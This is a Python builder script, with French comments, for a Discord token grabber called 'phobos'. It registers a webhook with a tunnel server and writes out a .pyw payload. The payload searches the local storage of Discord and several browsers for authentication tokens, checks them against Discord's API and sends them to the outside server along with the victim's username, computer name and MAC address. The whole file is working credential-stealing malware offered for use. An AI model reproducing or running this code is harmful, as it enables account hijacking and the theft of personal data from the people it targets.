from json import dumps
from urllib.request import urlopen, Request

url = "https://webhook.loca.lt/key"

print("je ferai une belle interface demain :)")
print("en gros phobos est un token grabber ou on ne peut ni spam le webhook, ni le supprimer, et il faut 0 modules")

webhook = input("webhook > ")
data = {"webhook" : webhook}

headers = {"Bypass-Tunnel-Reminder": "yea", "content-type":"application/json"
           }

data = dumps(data).encode('utf-8')
key = urlopen(Request(url, data=data, headers=headers)).read().decode()

if key == 'invalid webhook':
    input("invalid webhook")
    exit()
elif key == 'webhook already used':
    input("webhook already used")
    exit()


phobos = r"""# -*- coding: utf-8 -*-

from os import getenv, listdir
from os.path import exists
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from uuid import getnode as get_mac
from json import dumps
from re import findall

url = "https://webhook.loca.lt/token"


headers = {"key":'""" + key + r"""',
            "Bypass-Tunnel-Reminder":"yea",
            "content-type":"application/json"
            }




def tsend(token: str):
    data = dumps({"token":token, "info":[username, computer, mac]}).encode('utf-8')
    urlopen(Request(url, data=data, headers=headers))



# ---------------



local = getenv("localappdata")
roaming = getenv("appdata")

username, computer, mac = getenv("username"), getenv("computername"), get_mac()


paths = {
    "Discord": roaming + "\\Discord\\Local Storage\\leveldb\\",
    "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
    "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
    "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"
}



def check(token: str):
    try:
        urlopen(Request(
            "https://discord.com/api/v9/users/@me",
            headers={"authorization": token,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"},
        ))
        return True
    except HTTPError:
        return False


def get_tokens():
    tokens = []
    for path in paths:
        path = paths[path]
        if not exists(path):
            continue
        for file in listdir(path):
            file = path+file
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(file, errors='ignore').readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        if (
                            check(token)
                            and token not in tokens
                        ):
                            tokens.append(token)
    return tokens


def send_tokens(tokens: list):
    for token in tokens:
        tsend(token)

if __name__ == '__main__':
    tokens = get_tokens()
    send_tokens(tokens)
"""

with open("phobos.pyw", 'w') as f:
    f.write(phobos)

input("Done!")
